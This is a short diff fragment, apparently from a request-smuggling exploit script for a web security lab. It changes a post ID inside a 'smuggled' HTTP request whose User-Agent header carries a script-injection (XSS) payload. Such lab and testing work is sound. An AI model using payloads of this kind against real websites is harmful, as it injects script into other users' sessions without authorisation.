@@ -34,7 +34,7 @@ Connection: keep-alive
 
 '''
 
-    smuggled = '''GET /post?postId=8 HTTP/1.1
+    smuggled = '''GET /post?postId=7 HTTP/1.1
 User-Agent: a"/><script>alert(1)</script>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
